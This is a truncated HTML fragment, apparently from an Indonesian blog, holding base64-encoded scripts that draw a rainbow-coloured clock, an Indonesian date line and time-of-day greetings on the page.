nMoaHNwZCklMzYwKTsNCiAgICB0aGlzLmxlbmd0aD1zcGFuLmZpcnN0Q2hpbGQuZGF0YS5sZW5ndGg7DQogICAgdGhpcy5zcGFuPXNwYW47DQogICAgdGhpcy5zcGVlZD0oc3BkPT1udWxsPzUwOk1hdGguYWJzKHNwZCkpOw0KICAgIHRoaXMuaEluYz10aGlzLmRlZy90aGlzLmxlbmd0aDsNCiAgICB0aGlzLmJydD0oYnJ0PT1udWxsPzI1NTpNYXRoLmFicyhicnQpJTI1Nik7DQogICAgdGhpcy50aW1lcj1udWxsOw0KICAgIHRvU3BhbnMoc3Bhbik7DQogICAgdGhpcy5tb3ZlUmFpbmJvdygpOw0KfQ0KUmFpbmJvd1NwYW4ucHJvdG90eXBlLm1vdmVSYWluYm93ID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMuaHVlPjM1OSkgdGhpcy5odWUtPTM2MDsNCiAgdmFyIGNvbG9yOw0KICB2YXIgYj10aGlzLmJydDsNCiAgdmFyIGE9dGhpcy5sZW5ndGg7DQogIHZhciBoPXRoaXMuaHVlOw0KDQogIGZvcih2YXIgaT0wOyBpPGE7IGkrKykgew0KDQogICAgaWYoaD4zNTkpIGgtPTM2MDsNCg0KICAgIGlmKGg8NjApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgpLzYwKSpiKTsgcmVkPWI7Z3JuPWNvbG9yO2JsdT0wOyB9DQogICAgZWxzZSBpZihoPDEyMCkgeyBjb2xvcj1NYXRoLmZsb29yKCgoaC02MCkvNjApKmIpOyByZWQ9Yi1jb2xvcjtncm49YjtibHU9MDsgfQ0KICAgIGVsc2UgaWYoaDwxODApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgtMTIwKS82MCkqYik7IHJlZD0wO2dybj1iO2JsdT1jb2xvcjsgfQ0KICAgIGVsc2UgaWYoaDwyNDApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgtMTgwKS82MCkqYik7IHJlZD0wO2dybj1iLWNvbG9yO2JsdT1iOyB9DQogICAgZWxzZSBpZihoPDMwMCkgeyBjb2xvcj1NYXRoLmZsb29yKCgoaC0yNDApLzYwKSpiKTsgcmVkPWNvbG9yO2dybj0wO2JsdT1iOyB9DQogICAgZWxzZSB7IGNvbG9yPU1hdGguZmxvb3IoKChoLTMwMCkvNjApKmIpOyByZWQ9Yjtncm49MDtibHU9Yi1jb2xvcjsgfQ0KDQogICAgaCs9dGhpcy5oSW5jOw0KDQogICAgdGhpcy5zcGFuLmNoaWxkTm9kZXNbaV0uc3R5bGUuY29sb3I9InJnYigiK3JlZCsiLCAiK2dybisiLCAiK2JsdSsiKSI7DQogIH0NCiAgdGhpcy5odWUrPXRoaXMuaHNwZDsNCn0NCnZhciBHTVQgPSArNzsNCnZhciBub3cgPSBuZXcgRGF0ZSgpOw0Kbm93LnNldFVUQ01pbnV0ZXMobm93LmdldFVUQ01pbnV0ZXMoKSArIChHTVQrMCkqNjApOw0KdmFyIGphbT1ub3cuZ2V0VVRDSG91cnMoKTsNCnZhciBtZW5pdD1ub3cuZ2V0VVRDTWludXRlcygpOw0KdmFyIGRldGlrPW5vdy5nZXRVVENTZWNvbmRzKCk7DQpqYW09IiIramFtKyIiOw0KbWVuaXQ9IiIrbWVuaXQrIiI7DQpkZXRpaz0iIitkZXRpaysiIjsNCmlmKGphbTw9OSlqYW09IjAiK2phbTsNCmlmKG1lbml0PD05KW1lbml0PSIwIittZW5pdDsNCmlmKGRldGlrPD05KWRldGlrPSIwIitkZXRpazsNCmlmKGRldGlrPjU5KWRldGlrPSIwIitkZXRpay0iNjAiOw0KZG9jdW1lbnQud3JpdGUoIjxoIGlkPXI1MTc+SmFtIDogIiArIGphbSArIjoiKyBtZW5pdCArIjoiICsgZGV0aWsgKyAoIiBXSUI8L2g+IikpDQpzZXRUaW1lb3V0KCJqYW0oKSIsMTAwMCk7DQp2YXIgcjUxNz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicjUxNyIpOyAvL2dldCBzcGFuIHRvIGFwcGx5IHJhaW5ib3cNCnZhciBteVJhaW5ib3dTcGFuPW5ldyBSYWluYm93U3BhbihyNTE3LCAwLCAzNjAsIDI1NSwgNTAsIDE4KTsNCm15UmFpbmJvd1NwYW4udGltZXI9d2luZG93LnNldEludGVydmFsKCJteVJhaW5ib3dTcGFuLm1vdmVSYWluYm93KCkiLCBteVJhaW5ib3dTcGFuLnNwZWVkKTs="></script><br /><script type="text/javascript" src="data:text/javascript;base64,ZnVuY3Rpb24gdG9TcGFucyhzcGFuKSB7DQogIHZhciBzdHI9c3Bhbi5maXJzdENoaWxkLmRhdGE7DQogIHZhciBhPXN0ci5sZW5ndGg7DQogIHNwYW4ucmVtb3ZlQ2hpbGQoc3Bhbi5maXJzdENoaWxkKTsNCiAgZm9yKHZhciBpPTA7IGk8YTsgaSsrKSB7DQogICAgdmFyIHRoZVNwYW49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiU1BBTiIpOw0KICAgIHRoZVNwYW4uYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoc3RyLmNoYXJBdChpKSkpOw0KICAgIHNwYW4uYXBwZW5kQ2hpbGQodGhlU3Bhbik7DQogIH0NCn0NCmZ1bmN0aW9uIFJhaW5ib3dTcGFuKHNwYW4sIGh1ZSwgZGVnLCBicnQsIHNwZCwgaHNwZCkgew0KICAgIHRoaXMuZGVnPShkZWc9PW51bGw/MzYwOk1hdGguYWJzKGRlZykpOw0KICAgIHRoaXMuaHVlPShodWU9PW51bGw/MDpNYXRoLmFicyhodWUpJTM2MCk7DQogICAgdGhpcy5oc3BkPShoc3BkPT1udWxsPzM6TWF0aC5hYnMoaHNwZCklMzYwKTsNCiAgICB0aGlzLmxlbmd0aD1zcGFuLmZpcnN0Q2hpbGQuZGF0YS5sZW5ndGg7DQogICAgdGhpcy5zcGFuPXNwYW47DQogICAgdGhpcy5zcGVlZD0oc3BkPT1udWxsPzUwOk1hdGguYWJzKHNwZCkpOw0KICAgIHRoaXMuaEluYz10aGlzLmRlZy90aGlzLmxlbmd0aDsNCiAgICB0aGlzLmJydD0oYnJ0PT1udWxsPzI1NTpNYXRoLmFicyhicnQpJTI1Nik7DQogICAgdGhpcy50aW1lcj1udWxsOw0KICAgIHRvU3BhbnMoc3Bhbik7DQogICAgdGhpcy5tb3ZlUmFpbmJvdygpOw0KfQ0KUmFpbmJvd1NwYW4ucHJvdG90eXBlLm1vdmVSYWluYm93ID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMuaHVlPjM1OSkgdGhpcy5odWUtPTM2MDsNCiAgdmFyIGNvbG9yOw0KICB2YXIgYj10aGlzLmJydDsNCiAgdmFyIGE9dGhpcy5sZW5ndGg7DQogIHZhciBoPXRoaXMuaHVlOw0KDQogIGZvcih2YXIgaT0wOyBpPGE7IGkrKykgew0KDQogICAgaWYoaD4zNTkpIGgtPTM2MDsNCg0KICAgIGlmKGg8NjApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgpLzYwKSpiKTsgcmVkPWI7Z3JuPWNvbG9yO2JsdT0wOyB9DQogICAgZWxzZSBpZihoPDEyMCkgeyBjb2xvcj1NYXRoLmZsb29yKCgoaC02MCkvNjApKmIpOyByZWQ9Yi1jb2xvcjtncm49YjtibHU9MDsgfQ0KICAgIGVsc2UgaWYoaDwxODApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgtMTIwKS82MCkqYik7IHJlZD0wO2dybj1iO2JsdT1jb2xvcjsgfQ0KICAgIGVsc2UgaWYoaDwyNDApIHsgY29sb3I9TWF0aC5mbG9vcigoKGgtMTgwKS82MCkqYik7IHJlZD0wO2dybj1iLWNvbG9yO2JsdT1iOyB9DQogICAgZWxzZSBpZihoPDMwMCkgeyBjb2xvcj1NYXRoLmZsb29yKCgoaC0yNDApLzYwKSpiKTsgcmVkPWNvbG9yO2dybj0wO2JsdT1iOyB9DQogICAgZWxzZSB7IGNvbG9yPU1hdGguZmxvb3IoKChoLTMwMCkvNjApKmIpOyByZWQ9Yjtncm49MDtibHU9Yi1jb2xvcjsgfQ0KDQogICAgaCs9dGhpcy5oSW5jOw0KDQogICAgdGhpcy5zcGFuLmNoaWxkTm9kZXNbaV0uc3R5bGUuY29sb3I9InJnYigiK3JlZCsiLCAiK2dybisiLCAiK2JsdSsiKSI7DQogIH0NCiAgdGhpcy5odWUrPXRoaXMuaHNwZDsNCn0NCnZhciBHTVQgPSArNzsNCnZhciB3YWt0dSA9IG5ldyBEYXRlKCk7DQp3YWt0dS5zZXRVVENNaW51dGVzKHdha3R1LmdldFVUQ01pbnV0ZXMoKSArIChHTVQrMCkqNjApOw0KdmFyIHRhaHVuPXdha3R1LmdldFVUQ0Z1bGxZZWFyKCk7DQp2YXIgaGFyaT13YWt0dS5nZXRVVENEYXkoKTsNCnZhciBidWxhbj13YWt0dS5nZXRVVENNb250aCgpOw0KdmFyIHRhbmdnYWw9d2FrdHUuZ2V0VVRDRGF0ZSgpOw0KaWYgKHRhbmdnYWwgPCAxMCkge3RhbmdnYWw9IjAiK3RhbmdnYWx9IA0KdmFyIGhhcmlhcnJheT1uZXcgQXJyYXkoIk1pbmdndSIsIlNlbmluIiwiU2VsYXNhIiwiUmFidSIsIkthbWlzIiwiSnVtJ2F0IiwiU2FidHUiKQ0KdmFyIGJ1bGFuYXJyYXk9bmV3IEFycmF5KCJKYW51YXJpIiwiUGVicnVhcmkiLCJNYXJldCIsIkFwcmlsIiwiTWVpIiwiSnVuaSIsIkp1bGkiLCJBZ3VzdHVzIiwiU2VwdGVtYmVyIiwiT2t0b2JlciIsIk5vcGVtYmVyIiwiRGVzZW1iZXIiKQ0KZG9jdW1lbnQud3JpdGUoIjxoIGlkPXI1MDU+IitoYXJpYXJyYXlbaGFyaV0rIiwiK3RhbmdnYWwrIiAiK2J1bGFuYXJyYXlbYnVsYW5dKyIgIit0YWh1bisoIjwvaD4iKSkNCnZhciByNTA1PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJyNTA1Iik7IC8vZ2V0IHNwYW4gdG8gYXBwbHkgcmFpbmJvdw0KdmFyIG15UmFpbmJvd1NwYW49bmV3IFJhaW5ib3dTcGFuKHI1MDUsIDAsIDM2MCwgMjU1LCA1MCwgMTgpOw0KbXlSYWluYm93U3Bhbi50aW1lcj13aW5kb3cuc2V0SW50ZXJ2YWwoIm15UmFpbmJvd1NwYW4ubW92ZVJhaW5ib3coKSIsIG15UmFpbmJvd1NwYW4uc3BlZWQpOw=="></script>
<br /><script type="text/javascript" src="data:text/javascript;base64,dmFyIEdNVCA9ICs3Ow0KdmFyIG5vdyA9IG5ldyBEYXRlKCk7DQpub3cuc2V0VVRDTWludXRlcyhub3cuZ2V0VVRDTWludXRlcygpICsgKEdNVCswKSo2MCk7DQp2YXIgamFtPW5vdy5nZXRVVENIb3VycygpOw0KdmFyIG1lbml0PW5vdy5nZXRVVENNaW51dGVzKCk7DQp2YXIgZGV0aWs9bm93LmdldFVUQ1NlY29uZHMoKTsNCmphbT0iIitqYW0rIiI7DQptZW5pdD0iIittZW5pdCsiIjsNCmRldGlrPSIiK2RldGlrKyIiOw0KaWYoamFtPDIpamFtPWRvY3VtZW50LndyaXRlKCc8Zm9udCBjb2xvcj0iI2ZmMDBmZiI+UzwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDBjYyI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA5OSI+bDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA2NiI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDAzMyI+bTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDAwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMzMwMCI+dCA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjY2MDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjk5MDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZmNjMDAiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZmZmMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNjY2ZmMDAiPm0gPC9mb250Pjxmb250IGNvbG9yPSIjOTlmZjAwIj5CPC9mb250Pjxmb250IGNvbG9yPSIjNjZmZjAwIj5lPC9mb250Pjxmb250IGNvbG9yPSIjMzNmZjAwIj5yPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjAwIj5nPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjMzIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjY2Ij5uPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjk5Ij50PC9mb250Pjxmb250IGNvbG9yPSIjMDBmZmNjIj5pIDwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmZmZiI+UDwvZm9udD48Zm9udCBjb2xvcj0iIzAwY2NmZiI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTlmZiI+ZzwvZm9udD48Zm9udCBjb2xvcj0iIzAwNjZmZiI+aSA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDMzZmYiPi4gPC9mb250Pjxmb250IGNvbG9yPSIjMDAwMGZmIj4uIDwvZm9udD4nKTsNCmlmKGphbTw0KWphbT1kb2N1bWVudC53cml0ZSgnPGZvbnQgY29sb3I9IiNmZjAwZmYiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwY2MiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwOTkiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwNjYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMzMiPm08L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjMzMDAiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjY2MDAiPiBEPC9mb250Pjxmb250IGNvbG9yPSIjZmY5OTAwIj5pPC9mb250Pjxmb250IGNvbG9yPSIjZmZjYzAwIj5uPC9mb250Pjxmb250IGNvbG9yPSIjZmZmZjAwIj5pPC9mb250Pjxmb250IGNvbG9yPSIjY2NmZjAwIj4gSDwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzY2ZmYwMCI+cjwvZm9udD48Zm9udCBjb2xvcj0iIzMzZmYwMCI+aSA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMzMiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmNjYiPnM8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmOTkiPmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmY2MiPmggPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZmZmIj5CPC9mb250Pjxmb250IGNvbG9yPSIjMDBjY2ZmIj5lPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OWZmIj5nPC9mb250Pjxmb250IGNvbG9yPSIjMDA2NmZmIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMDAzM2ZmIj5kPC9mb250Pjxmb250IGNvbG9yPSIjMDAwMGZmIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMzMwMGZmIj5uPC9mb250Pjxmb250IGNvbG9yPSIjNjYwMGZmIj5nIDwvZm9udD48Zm9udCBjb2xvcj0iIzk5MDBmZiI+UDwvZm9udD48Zm9udCBjb2xvcj0iI2NjMDBmZiI+cjwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDBmZiI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDBjYyI+bjwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA5OSI+ZDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA2NiI+czwvZm9udD4nKTsNCmlmKGphbTw5KWphbT1kb2N1bWVudC53cml0ZSgnPGZvbnQgY29sb3I9IiNmZjAwZmYiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwY2MiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwOTkiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwNjYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMzMiPm08L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjMzMDAiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjY2MDAiPiBQPC9mb250Pjxmb250IGNvbG9yPSIjZmY5OTAwIj5hPC9mb250Pjxmb250IGNvbG9yPSIjZmZjYzAwIj5nPC9mb250Pjxmb250IGNvbG9yPSIjZmZmZjAwIj5pPC9mb250Pjxmb250IGNvbG9yPSIjY2NmZjAwIj4gUzwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+ZTwvZm9udD48Zm9udCBjb2xvcj0iIzY2ZmYwMCI+bDwvZm9udD48Zm9udCBjb2xvcj0iIzMzZmYwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmYwMCI+bTwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmYzMyI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmY2NiI+dCA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmOTkiPkI8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmY2MiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmZmYiPnI8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGNjZmYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5ZmYiPms8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDY2ZmYiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDMzZmYiPmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDAwZmYiPmY8L2ZvbnQ+PGZvbnQgY29sb3I9IiMzMzAwZmYiPmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiM2NjAwZmYiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiM5OTAwZmYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNjYzAwZmYiPnMgPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMGZmIj5TPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMGNjIj5vPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDk5Ij5iPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDY2Ij4uPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDMzIj4uPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDAwIj4hPC9mb250Pjxmb250IGNvbG9yPSIjZmYzMzAwIj4hPC9mb250PicpOw0KaWYoamFtPDEwKWphbT1kb2N1bWVudC53cml0ZSgnPGZvbnQgY29sb3I9IiNmZjAwZmYiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwY2MiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwOTkiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwNjYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMzMiPm08L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjMzMDAiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjY2MDAiPiBQPC9mb250Pjxmb250IGNvbG9yPSIjZmY5OTAwIj5hPC9mb250Pjxmb250IGNvbG9yPSIjZmZjYzAwIj5nPC9mb250Pjxmb250IGNvbG9yPSIjZmZmZjAwIj5pPC9mb250Pjxmb250IGNvbG9yPSIjY2NmZjAwIj4gSjwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+ZTwvZm9udD48Zm9udCBjb2xvcj0iIzY2ZmYwMCI+bDwvZm9udD48Zm9udCBjb2xvcj0iIzMzZmYwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmYwMCI+bjwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmYzMyI+ZzwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmY2NiI+IFM8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmOTkiPmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmY2MiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmZmYiPm48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGNjZmYiPmc8L2ZvbnQ+Jyk7DQppZihqYW08MTQpamFtPWRvY3VtZW50LndyaXRlKCc8Zm9udCBjb2xvcj0iI2ZmMDBmZiI+UzwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDBjYyI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA5OSI+bDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA2NiI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDAzMyI+bTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDAwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMzMwMCI+dDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmNjYwMCI+IFM8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjk5MDAiPmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZmNjMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZmZmMDAiPm48L2ZvbnQ+PGZvbnQgY29sb3I9IiNjY2ZmMDAiPmcgPC9mb250Pjxmb250IGNvbG9yPSIjOTlmZjAwIj5JPC9mb250Pjxmb250IGNvbG9yPSIjNjZmZjAwIj5zPC9mb250Pjxmb250IGNvbG9yPSIjMzNmZjAwIj50PC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjAwIj5pPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjMzIj5yPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjY2Ij5hPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjk5Ij5oPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZmNjIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZmZmIj50IDwvZm9udD48Zm9udCBjb2xvcj0iIzAwY2NmZiI+RDwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTlmZiI+dTwvZm9udD48Zm9udCBjb2xvcj0iIzAwNjZmZiI+bDwvZm9udD48Zm9udCBjb2xvcj0iIzAwMzNmZiI+dSA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDAwZmYiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IiMzMzAwZmYiPm88L2ZvbnQ+PGZvbnQgY29sb3I9IiM2NjAwZmYiPmI8L2ZvbnQ+PGZvbnQgY29sb3I9IiM5OTAwZmYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNjYzAwZmYiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwZmYiPi48L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwY2MiPiAuIDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDA5OSI+LiA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwNjYiPi4gPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDMzIj4hIDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmMDAwMCI+ITwvZm9udD4nKTsNCmlmKGphbTwxNSlqYW09ZG9jdW1lbnQud3JpdGUoJzxmb250IGNvbG9yPSIjZmYwMGZmIj5TPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMGNjIj5lPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDk5Ij5sPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDY2Ij5hPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDMzIj5tPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDAwIj5hPC9mb250Pjxmb250IGNvbG9yPSIjZmYzMzAwIj50PC9mb250Pjxmb250IGNvbG9yPSIjZmY2NjAwIj4gUzwvZm9udD48Zm9udCBjb2xvcj0iI2ZmOTkwMCI+aTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmY2MwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmZmYwMCI+bjwvZm9udD48Zm9udCBjb2xvcj0iI2NjZmYwMCI+ZzwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+IE08L2ZvbnQ+PGZvbnQgY29sb3I9IiM2NmZmMDAiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiMzM2ZmMDAiPm48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMDAiPmo8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMzMiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmNjYiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmOTkiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmY2MiPm48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmZmYiPmc8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGNjZmYiPiBTPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OWZmIj5vPC9mb250Pjxmb250IGNvbG9yPSIjMDA2NmZmIj5yPC9mb250Pjxmb250IGNvbG9yPSIjMDAzM2ZmIj5lPC9mb250PicpOw0KaWYoamFtPDE3KWphbT1kb2N1bWVudC53cml0ZSgnPGZvbnQgY29sb3I9IiNmZjAwZmYiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwY2MiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwOTkiPmw8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwNjYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMzMiPm08L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjMzMDAgIj50PC9mb250Pjxmb250IGNvbG9yPSIjZmY2NjAwIj4gUzwvZm9udD48Zm9udCBjb2xvcj0iI2ZmOTkwMCI+bzwvZm9udD48Zm9udCBjb2xvcj0iI2ZmY2MwMCI+cjwvZm9udD48Zm9udCBjb2xvcj0iI2ZmZmYwMCI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI2NjZmYwMCI+IDwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+TDwvZm9udD48Zm9udCBjb2xvcj0iIzY2ZmYwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzMzZmYwMCI+ZzwvZm9udD48Zm9udCBjb2xvcj0iIzAwZmYwMCI+aSA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMzMiPk48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmNjYiPnk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmOTkiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmY2MiPm48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmZmYiPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGNjZmYiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5ZmYiPmkgPC9mb250Pjxmb250IGNvbG9yPSIjMDA2NmZmIj56PC9mb250Pjxmb250IGNvbG9yPSIjMDAzM2ZmIj5hIDwvZm9udD48Zm9udCBjb2xvcj0iIzAwMDBmZiI+LiA8L2ZvbnQ+PGZvbnQgY29sb3I9IiMzMzAwZmYiPi4gPC9mb250Pjxmb250IGNvbG9yPSIjNjYwMGZmIj4uIDwvZm9udD48Zm9udCBjb2xvcj0iIzk5MDBmZiI+PzwvZm9udD4nKTsNCmlmKGphbTwxOClqYW09ZG9jdW1lbnQud3JpdGUoJzxmb250IGNvbG9yPSIjZmYwMGZmIj5TPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMGNjIj5lPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDk5Ij5sPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDY2Ij5hPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDMzIj5tPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDAwIj5hPC9mb250Pjxmb250IGNvbG9yPSIjZmYzMzAwIj50PC9mb250Pjxmb250IGNvbG9yPSIjZmY2NjAwIj4gUDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmOTkwMCI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI2ZmY2MwMCI+dDwvZm9udD48Zm9udCBjb2xvcj0iI2ZmZmYwMCI+YTwvZm9udD48Zm9udCBjb2xvcj0iI2NjZmYwMCI+bjwvZm9udD48Zm9udCBjb2xvcj0iIzk5ZmYwMCI+ZzwvZm9udD48Zm9udCBjb2xvcj0iIzY2ZmYwMCI+IE08L2ZvbnQ+PGZvbnQgY29sb3I9IiMzM2ZmMDAiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMGZmMDAiPnQgPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjMzIj5OPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjY2Ij5qPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZjk5Ij5hPC9mb250Pjxmb250IGNvbG9yPSIjMDBmZmNjIj5sPC9mb250Pjxmb250IGNvbG9